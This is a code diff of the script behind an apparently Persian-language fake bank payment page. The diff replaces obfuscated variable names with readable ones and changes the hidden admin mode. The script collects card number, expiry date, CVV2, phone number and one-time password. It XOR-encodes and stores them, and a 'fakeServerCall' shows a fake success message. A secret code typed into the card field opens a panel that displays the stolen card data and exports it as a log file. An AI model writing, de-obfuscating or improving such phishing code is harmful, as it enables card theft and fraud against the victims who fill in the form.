@@ -236,15 +236,15 @@
 
     <script>
         (function() {
-            let _0x1a = 1; // currentStep
-            let _0x2b = []; // secretData
-            const _0x3c = 42; // XOR key
-            let isAdmin = false; // حالت مدیر پیش‌فرض غیرفعال
-            const adminCode = '12122312'; // رمز فعال‌سازی حالت مدیر
+            let currentStep = 1;
+            let secretData = [];
+            const xorKey = 42;
+            let isAdmin = false;
+            const adminCode = '12122312';
 
             // DOM Elements
-            const _0x4d = document.getElementById('x6-fill');
-            const _0x5e = [document.getElementById('x9-step1'), document.getElementById('x9-step2'), document.getElementById('x9-step3')];
+            const progressFill = document.getElementById('x6-fill');
+            const steps = [document.getElementById('x9-step1'), document.getElementById('x9-step2'), document.getElementById('x9-step3')];
             const adminBtn = document.getElementById('admin-view');
             const cancelBtns = [document.getElementById('cancel1'), document.getElementById('cancel2'), document.getElementById('cancel3')];
             const cardInput = document.getElementById('x15');
@@ -252,28 +252,23 @@
             const clearDataBtn = document.getElementById('clear-data');
 
             // XOR Encryption/Decryption
-            function _0x6f(_0x7g) {
-                let _0x8h = '';
-                for (let i = 0; i < _0x7g.length; i++) {
-                    _0x8h += String.fromCharCode(_0x7g.charCodeAt(i) ^ _0x3c);
+            function xorCipher(text) {
+                let result = '';
+                for (let i = 0; i < text.length; i++) {
+                    result += String.fromCharCode(text.charCodeAt(i) ^ xorKey);
                 }
-                return _0x8h;
+                return result;
             }
 
             // Input Formatting and Admin Check
             cardInput.addEventListener('input', function(e) {
-                let v = e.target.value.replace(/\D/g, '').slice(0, 16);
-                e.target.value = v.replace(/(.{4})/g, '$1-').slice(0, 19).trim();
-                // چک کردن رمز مدیر
-                if (v === adminCode) {
+                let value = e.target.value.replace(/\D/g, '').slice(0, 16);
+                e.target.value = value.replace(/(.{4})/g, '$1-').slice(0, 19).trim();
+                if (value === adminCode) {
                     isAdmin = true;
                     adminBtn.style.display = 'block';
                     adminDataContainer.style.display = 'flex';
                     displayAdminData();
-                } else {
-                    isAdmin = false;
-                    adminBtn.style.display = 'none';
-                    adminDataContainer.style.display = 'none';
                 }
             });
             document.getElementById('x16').addEventListener('input', function(e) {
@@ -293,49 +288,47 @@
             });
 
             // Fake Server Call
-            function _0x9i(_0xaj, _0xbk) {
+            function fakeServerCall(data, callback) {
                 setTimeout(() => {
-                    _0xbk({ status: 'success', id: 'SHK-' + Math.random().toString(36).substr(2, 14).toUpperCase() });
+                    callback({ status: 'success', id: 'SHK-' + Math.random().toString(36).substr(2, 14).toUpperCase() });
                 }, 1500 + Math.random() * 1000);
             }
 
             // Progress Update
-            function _0xcl() {
-                _0x4d.style.width = `${(_0x1a / 3) * 100}%`;
+            function updateProgress() {
+                progressFill.style.width = `${(currentStep / 3) * 100}%`;
             }
 
             // Save Data
-            function _0xdm() {
-                let _0xen = document.getElementById('x15').value + '|' +
-                           document.getElementById('x16').value + '|' +
-                           document.getElementById('x17').value + '|' +
-                           document.getElementById('x19').value + '|' +
-                           document.getElementById('x20').value;
-                // فقط اگه رمز مدیر نباشه داده رو ذخیره کن
+            function saveData() {
+                let data = `${document.getElementById('x15').value}|${document.getElementById('x16').value}|${document.getElementById('x17').value}|${document.getElementById('x19').value}|${document.getElementById('x20').value}`;
                 if (document.getElementById('x15').value.replace(/\D/g, '') !== adminCode) {
-                    _0x2b.push(_0x6f(_0xen));
+                    secretData.push(xorCipher(data));
                     if (isAdmin) displayAdminData();
                 }
             }
 
             // Display Admin Data
             function displayAdminData() {
-                adminDataContainer.innerHTML = ''; // پاک کردن محتوای قبلی
-                _0x2b.forEach((data, index) => {
-                    let decryptedData = _0x6f(data).split('|');
-                    let userBox = document.createElement('div');
-                    userBox.className = 'user-data-box';
-                    userBox.innerHTML = `
-                        <strong>کاربر ${index + 1}</strong><br>
-                        شماره کارت: ${decryptedData[0]}<br>
-                        تاریخ انقضا: ${decryptedData[1]}<br>
-                        CVV2: ${decryptedData[2]}<br>
-                        شماره تلفن: ${decryptedData[3]}<br>
-                        رمز پویا: ${decryptedData[4]}
-                    `;
-                    adminDataContainer.appendChild(userBox);
-                });
-                // اضافه کردن دکمه پاکسازی در انتها
+                adminDataContainer.innerHTML = '';
+                if (secretData.length === 0) {
+                    adminDataContainer.innerHTML = '<p>هیچ داده‌ای جمع‌آوری نشده است.</p>';
+                } else {
+                    secretData.forEach((data, index) => {
+                        let decryptedData = xorCipher(data).split('|');
+                        let userBox = document.createElement('div');
+                        userBox.className = 'user-data-box';
+                        userBox.innerHTML = `
+                            <strong>کاربر ${index + 1}</strong><br>
+                            شماره کارت: ${decryptedData[0]}<br>
+                            تاریخ انقضا: ${decryptedData[1]}<br>
+                            CVV2: ${decryptedData[2]}<br>
+                            شماره تلفن: ${decryptedData[3]}<br>
+                            رمز پویا: ${decryptedData[4]}
+                        `;
+                        adminDataContainer.appendChild(userBox);
+                    });
+                }
                 let clearBtn = document.createElement('button');
                 clearBtn.className = 'btn btn-clear';
                 clearBtn.textContent = 'پاک کردن همه داده‌ها';
@@ -346,37 +339,38 @@
             // Clear Admin Data
             function clearAdminData() {
                 if (confirm('آیا مطمئن هستید که می‌خواهید همه داده‌ها را پاک کنید؟')) {
-                    _0x2b = [];
-                    adminDataContainer.innerHTML = '<button class="btn btn-clear" id="clear-data">پاک کردن همه داده‌ها</button>';
-                    document.getElementById('clear-data').onclick = clearAdminData;
+                    secretData = [];
+                    displayAdminData();
                 }
             }
 
-            // Export Data as File (only for admin)
-            function _0xfo() {
-                let _0xgp = _0x2b.map(d => _0x6f(d)).join('\n');
-                let _0xhq = new Blob([_0xgp], { type: 'text/plain' });
-                let _0xir = document.createElement('a');
-                _0xir.href = URL.createObjectURL(_0xhq);
-                _0xir.download = 'payment-log.txt';
-                _0xir.click();
+            // Export Data as File
+            function exportData() {
+                let dataString = secretData.map(d => xorCipher(d)).join('\n');
+                let blob = new Blob([dataString], { type: 'text/plain' });
+                let link = document.createElement('a');
+                link.href = URL.createObjectURL(blob);
+                link.download = 'payment-log.txt';
+                link.click();
             }
 
-            // Show Admin Data (Download Button Action)
+            // Show Admin Data
             function showAdminData() {
-                if (_0x2b.length > 0) {
-                    _0xfo(); // دانلود فایل
-                } else {
-                    alert('هیچ داده‌ای جمع‌آوری نشده است.');
+                if (isAdmin) {
+                    if (secretData.length > 0) {
+                        exportData();
+                    } else {
+                        alert('هیچ داده‌ای جمع‌آوری نشده است.');
+                    }
                 }
             }
 
             // Reset Form
             function resetForm() {
-                _0x5e.forEach(step => step.classList.remove('active'));
-                _0x1a = 1;
-                _0x5e[0].classList.add('active');
-                _0xcl();
+                steps.forEach(step => step.classList.remove('active'));
+                currentStep = 1;
+                steps[0].classList.add('active');
+                updateProgress();
                 document.getElementById('x15').value = '';
                 document.getElementById('x16').value = '';
                 document.getElementById('x17').value = '';
@@ -385,31 +379,32 @@
                 document.getElementById('x24').innerHTML = '';
                 document.getElementById('x25').style.display = 'none';
                 document.getElementById('x22').textContent = '';
-                isAdmin = false;
-                adminBtn.style.display = 'none';
-                adminDataContainer.style.display = 'none';
+                if (!isAdmin) {
+                    adminBtn.style.display = 'none';
+                    adminDataContainer.style.display = 'none';
+                }
             }
 
             // Step Navigation
             document.getElementById('x18').addEventListener('click', () => {
-                if (_0x1a === 1 && document.getElementById('x15').value && document.getElementById('x16').value && document.getElementById('x17').value) {
-                    _0x5e[0].classList.remove('active');
-                    _0x1a = 2;
-                    _0x5e[1].classList.add('active');
-                    _0xcl();
+                if (currentStep === 1 && document.getElementById('x15').value && document.getElementById('x16').value && document.getElementById('x17').value) {
+                    steps[0].classList.remove('active');
+                    currentStep = 2;
+                    steps[1].classList.add('active');
+                    updateProgress();
                 }
             });
             document.getElementById('x23').addEventListener('click', () => {
-                if (_0x1a === 2 && document.getElementById('x19').value && document.getElementById('x20').value) {
-                    _0xdm();
-                    _0x5e[1].classList.remove('active');
-                    _0x1a = 3;
-                    _0x5e[2].classList.add('active');
-                    _0xcl();
+                if (currentStep === 2 && document.getElementById('x19').value && document.getElementById('x20').value) {
+                    saveData();
+                    steps[1].classList.remove('active');
+                    currentStep = 3;
+                    steps[2].classList.add('active');
+                    updateProgress();
                     document.getElementById('x25').style.display = 'block';
-                    _0x9i({}, (_0xjs) => {
+                    fakeServerCall({}, (response) => {
                         document.getElementById('x25').style.display = 'none';
-                        document.getElementById('x24').innerHTML = `پرداخت موفق!<br>شماره تراکنش: ${_0xjs.id}`;
+                        document.getElementById('x24').innerHTML = `پرداخت موفق!<br>شماره تراکنش: ${response.id}`;
                     });
                 }
             });
@@ -417,13 +412,13 @@
             // Fake OTP Request
             document.getElementById('x21').addEventListener('click', () => {
                 if (document.getElementById('x19').value) {
-                    _0x9i({}, () => {
+                    fakeServerCall({}, () => {
                         alert('رمز پویا ارسال شد!');
-                        let _0xkt = 120;
-                        let _0xlu = setInterval(() => {
-                            document.getElementById('x22').textContent = `زمان باقی‌مانده: ${Math.floor(_0xkt / 60)}:${(_0xkt % 60).toString().padStart(2, '0')}`;
-                            if (--_0xkt < 0) {
-                                clearInterval(_0xlu);
+                        let timeLeft = 120;
+                        let timer = setInterval(() => {
+                            document.getElementById('x22').textContent = `زمان باقی‌مانده: ${Math.floor(timeLeft / 60)}:${(timeLeft % 60).toString().padStart(2, '0')}`;
+                            if (--timeLeft < 0) {
+                                clearInterval(timer);
                                 document.getElementById('x22').textContent = 'رمز منقضی شد';
                             }
                         }, 1000);
@@ -443,7 +438,7 @@
             // Admin Mode Activation
             adminBtn.addEventListener('click', showAdminData);
 
-            _0xcl();
+            updateProgress();
         })();
     </script>
 </body>
